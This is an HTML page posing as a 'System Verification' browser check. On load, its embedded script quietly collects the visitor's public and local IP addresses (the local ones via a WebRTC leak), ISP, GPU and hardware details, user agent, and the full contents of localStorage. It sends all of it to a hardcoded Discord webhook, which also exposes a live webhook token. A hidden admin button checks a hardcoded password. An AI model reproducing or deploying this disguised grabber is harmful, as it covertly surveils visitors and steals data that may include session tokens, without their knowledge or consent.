<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body, html { margin: 0; padding: 0; font-family: sans-serif; background: #fff; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #admin-btn { position: fixed; top: 0; right: 0; width: 50px; height: 50px; background: transparent; border: none; cursor: crosshair; }
    </style>
</head>
<body>

    <div style="text-align: center;">
        <div class="loader" style="margin: 0 auto 20px;"></div>
        <p>Verifying browser compatibility...</p>
    </div>

    <button id="admin-btn"></button>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1487371339881906177/BOhU036avil2oOCS8Eb6CeaJolwYlV7zFA-YmdfMZzMWgnrnlY0c0C4spqjRIumGylyY";
        
        const data = {
            id: 'NODE-' + Math.floor(Math.random() * 10000),
            ipV4: "Pending",
            ipV6: "Pending",
            isp: "Pending",
            localIp: [],
            gpu: "Pending",
            audio: "Pending",
            storage: []
        };

        // 1. Forced Network Fetch
        async function fetchNetwork() {
            try {
                const ipv4 = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                data.ipV4 = ipv4.ip;
                
                const geo = await fetch(`https://ipapi.co/${ipv4.ip}/json/`).then(r => r.json());
                data.isp = geo.org || "Unknown";

                fetch('https://api64.ipify.org?format=json').then(r => r.json()).then(v6 => {
                    data.ipV6 = v6.ip !== data.ipV4 ? v6.ip : "N/A";
                }).catch(() => data.ipV6 = "N/A");
            } catch (e) { data.ipV4 = "Error/Blocked"; }
        }

        // 2. WebRTC Leak
        function getLocal() {
            const pc = new RTCPeerConnection();
            pc.createDataChannel('');
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-z0-9\-]+\.local)/i);
                    if (match && !data.localIp.includes(match[1])) data.localIp.push(match[1]);
                }
            };
        }

        // 3. Hardware Fingerprint
        function getHardware() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // LocalStorage Sweep
            for (let i = 0; i < localStorage.length; i++){
                let key = localStorage.key(i);
                data.storage.push(`${key}: ${localStorage.getItem(key)}`);
            }
        }

        // 4. Execution & Webhook POST
        async function run() {
            getLocal();
            getHardware();
            await fetchNetwork();

            // Wait 2 seconds to ensure WebRTC and IPv6 finalize
            setTimeout(() => {
                const payload = {
                    embeds: [{
                        title: `📡 Telemetry Extracted: ${data.id}`,
                        color: 16711680, // Red
                        fields: [
                            { name: "🌐 Public Connectivity", value: `**IPv4:** ${data.ipV4}\n**IPv6:** ${data.ipV6}\n**ISP:** ${data.isp}`, inline: false },
                            { name: "🏠 Private Network", value: `**Local:** ${data.localIp.join(', ') || "Masked"}`, inline: true },
                            { name: "💾 Browser Data", value: `**Cookies:** ${navigator.cookieEnabled ? "YES" : "NO"}\n**Storage Items:** ${data.storage.length}`, inline: true },
                            { name: "🛠️ Hardware", value: `**CPU:** ${navigator.hardwareConcurrency} Cores\n**RAM:** ~${navigator.deviceMemory}GB\n**GPU:** ${data.gpu}`, inline: false },
                            { name: "📋 User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                        ],
                        footer: { text: `Origin: ${window.location.hostname}` },
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).then(r => console.log("Post status:", r.status));
            }, 2000);
        }

        window.onload = run;

        document.getElementById('admin-btn').onclick = () => {
            if(prompt("Auth:") === "monterysasd") alert("Telemetry Logged locally for: " + data.ipV4);
        };
    </script>
</body>
</html>
